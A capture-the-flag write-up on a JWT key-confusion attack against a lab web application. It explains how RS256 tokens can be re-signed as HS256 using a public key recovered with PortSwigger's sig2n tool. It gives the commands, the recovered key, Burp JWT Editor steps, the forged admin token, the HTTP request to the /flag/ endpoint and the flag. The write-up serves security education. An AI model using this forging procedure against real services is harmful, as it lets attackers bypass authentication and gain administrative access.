# CTFkom 03.09.2025 - Writeup Asymmetric JWT

# Objective and scope

---

The target application at `http://129.241.150.108:30005` uses a `jwt` cookie for session handling. The objective was to assess and exploit the session handling in order to forge an administrative token and reach the protected endpoint `/flag/`.

# How do Key Confusion Attacks Work

---

JSON Web Tokens encode a header, a payload, and a signature. RS256 uses an RSA private key for signing and an RSA public key for verification. HS256 uses an HMAC secret for both signing and verification. If a verifier accepts the token’s `alg` header and reuses RSA public-key material as an HMAC secret, an attacker who knows the public key can sign HS256 tokens that the server will accept as authentic. This is then called a key confusion attack. The key questions are whether the public key can be recovered, and which exact byte representation the verifier treats as the HMAC secret, because flawed implementations vary between SubjectPublicKeyInfo, PKCS#1, DER bytes, or even literal PEM text.

# Collected material

---

An RS256 JWT was observed in traffic and used as input for public-key recovery:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTc1NjkyMzkxNywiZGF0ZV9vZl9iaXJ0aCI6IiJ9.wL0y3OEdqPzEQUYhEfFgETAGuVlysnPbgf6molGDCG8FMkGUvhy24_w8O1jljJ-V5hmY2U6xjqTGtpvMgzG44g
```

When decoding the token, we see the following content inside of the JWT:

```json
{
  "alg": "RS256",
  "typ": "JWT"
}
{
  "username": "test",
  "admin": false,
  "exp": 1756923917,
  "date_of_birth": ""
}
```

The important value is the “admin” boolean, which shows the server if a user has administrative permissions to access the /flag/ endpoint.

So the goal is to forge a token that sets the “value” to `true` and have a valid expiration date and a valid signature. Since this token is using asymmetric algorithms to for signature verification, we cannot just bruteforce the secret. Usually, the first things that comes to mind is a key confusion attack. This type of attack is described at the beginning of the writeup.

Do perform such an attack, a second RS256 token with a slightly different payload was captured to improve recovery:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QxMjMiLCJhZG1pbiI6ZmFsc2UsImV4cCI6MTc1NjkyNDAzMiwiZGF0ZV9vZl9iaXJ0aCI6IiJ9.vUsAqmHufwd7YoREteaxxx9LMPp_fNdPWV7XbWjoOn8gO7kRlz8E9s1EVbT1xetuTB0LHYXxMW2z33c9Pd4E7g
```

# Public-key recovery and initial acceptance test

---

Since the public key is not hosted publicly (or at least it’s hidden very well), we need to reconstruct the public key. PortSwigger’s `sig2n` was used to reconstruct the RSA public key and emit candidate HS256 tokens. This is the only helper command that was required:

```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```

Relevant terminal output:

```
Running command: python3 jwt_forgery.py <token1> <token2>

Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1---[snip]---tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=
    Tampered JWT: eyJhbGciOiJ---[snip]---fYqUsPY
    Base64 encoded pkcs1 key: LS0---[snip]---S0VZLS0tLS0K
    Tampered JWT: eyJhbGci---[snip]---eAibOmH_zyg-w

Found n with multiplier 2:
    Base64 encoded x509 key: LS0tLS1C---[snip]---VQkxJQyBLRVktLS0tLQo=
    Tampered JWT: eyJhbGciOi---[snip]---qfsOmB_tqg
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1FZ0NRUURIeXNSeEFBNFZGdHNZVW5KRUFSc1JINDZQVmtLeWcwL0lRTW9yTk1CY01qK3A2Y0VoZEJKdmNzSDEKanE1dUpYWTJOWDQvellOeUg4djRzNW5rUzM2dEFnTUJBQUU9Ci0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ0ZXN0IiwgImFkbWluIjogZmFsc2UsICJleHAiOiAxNzU3MDA5ODY0LCAiZGF0ZV9vZl9iaXJ0aCI6ICIifQ.z4pUOUyrCJFInLoXXyBIPbl7_T25t5IWbB732uLCHPE
```

The script found two different multipliers, so I just tried all the tokens (Tampered JWT) and sent them to the server. The last “tampered” HS256 token was accepted by the server rather than causing a redirect, which proved algorithm confusion and indicated that the verifier reused public-key material as an HMAC secret. So the PKCS#1 RSA PUBLIC KEY PEM text bytes from the “multiplier 2” value are considered valid. This matters because the exact bytes used as the HMAC secret must match the verifier’s expectation.

# Determining the Exact Secret Bytes

---

The sig2n line labeled “Base64 encoded pkcs1 key” for multiplier 2 is the base64 of the RSA PUBLIC KEY PEM text. Decoding it yields the full `-----BEGIN RSA PUBLIC KEY-----` block with header, footer, and line breaks. The verifier treated those literal PEM bytes as the HMAC secret, not DER, not SPKI, and not x509.

# Burp Suite Exploitation Using JWT Editor

---

This attack can be performed entirely in Burp by registering the correct symmetric key and letting the extension re-sign the token. We need the JWT Editor extension in burp to perform this attack.

The following base64 value can be used in the k value in the JWT token (this is the public key that we reconstructed earlier):

```
LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1FZ0NRUURIeXNSeEFBNFZGdHNZVW5KRUFSc1JINDZQVmtLeWcwL0lRTW9yTk1CY01qK3A2Y0VoZEJKdmNzSDEKanE1dUpYWTJOWDQvellOeUg4djRzNW5rUzM2dEFnTUJBQUU9Ci0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
```

In Burp Suite, the attack can now be done. Here are the exact steps to forge a token and sign it using the public key:

1. Open the JWT Editor Key**s** tab. Click New Symmetric Key. Set `kty` to `oct`. Set `k` to the public key that’s base64 encoded. Optionally set a `kid`, but this is not required. Save the key.
2. Send a request that carries the `jwt` cookie to Repeater. Select that request and open the JSON Web Token tab for the cookie value.
3. Edit the JWT header so that `alg` is `HS256` and `typ` is `JWT`.
4. Edit the payload to include the intended claims. Use at least `{"username":"test","admin":true,"exp":<fresh-epoch>,"date_of_birth":""}`. The exp can be calculated using this website [https://www.unixtimestamp.com/](https://www.unixtimestamp.com/)
5. Click **Sign** and choose the symmetric key created in the JWT Editor Keys tab. Burp replaces the signature with a valid HS256 HMAC using the registered key.
6. Send the request to `/flag/`. 

The endpoint shows a 200 status code and shows the flag. The full request and response is shown in the next chapter.

# Access to the Protected Resource and Flag

---

With the forged token set in the `jwt` cookie, `/flag/` returned HTTP 200 and the flag was present in the response. Here is the request that was being used request:

```
GET /flag/ HTTP/1.1
Host: 129.241.150.108:30005
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://129.241.150.108:30005/home/
Cookie: jwt=**eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJhZG1pbiI6dHJ1ZSwiZXhwIjoxNzU3MDExMTc2LCJkYXRlX29mX2JpcnRoIjoiIn0.n7ShzBoadFfV-fhkE6RvtcNWO9KBm56qXGg65iPuW_g**
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

The result was a HTTP 200 with the flag in the response body. This confirms that the server validated a HS256 signature produced with the PKCS#1 PEM text secret and accepted the administrative claim.

![image.png](image.png)

The flag is:

```
CTFkom{ddaf66f1b50d425e7d68ad930ae563a}
```

# Conclusion

---

The verifier accepted the token’s `alg` header and reused RSA public-key material as an HMAC secret. The exact secret matched the decoded PKCS#1 RSA PUBLIC KEY PEM text bytes from `sig2n` multiplier 2. Constructing and signing an HS256 token with `admin: true` and a valid expiry in Burp’s JWT Editor yielded HTTP 200 on `/flag/`.

This proves that there is a key confusion vulnerability in the token verifier which can be abused to forge tokens with administrative access.